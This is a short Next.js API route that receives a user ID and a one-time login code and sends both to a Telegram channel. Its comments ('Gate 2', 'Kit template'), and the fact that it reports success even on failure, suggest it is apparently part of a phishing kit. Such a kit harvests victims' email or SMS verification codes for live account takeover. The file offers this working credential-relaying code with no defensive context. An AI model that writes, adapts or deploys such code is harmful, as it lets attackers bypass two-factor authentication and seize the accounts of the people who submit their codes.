import { NextRequest, NextResponse } from "next/server"

import { getClientIpFromRequest } from "@/lib/client-ip"
import { sendFormNotification } from "@/lib/telegram"

/**
 * Gate 2 OTP submit event → ops Telegram.
 * Kit template: `sendFormNotification` type "login_email_otp_verification" / "login_text_otp_verification".
 */
export async function POST(request: NextRequest) {
  try {
    const data = (await request.json().catch(() => ({}))) as Record<
      string,
      unknown
    >;
    const method = data.method === "text" ? "text" : "email";

    await sendFormNotification({
      type:
        method === "email"
          ? "login_email_otp_verification"
          : "login_text_otp_verification",
      userId: String(data.userId ?? ""),
      otp: String(data.code ?? ""),
      page: "/verification/code",
      timestamp: new Date().toISOString(),
    });

    return NextResponse.json({ success: true });
  } catch (error) {
    console.error("OTP notify failed:", error);
    return NextResponse.json({ success: true });
  }
}
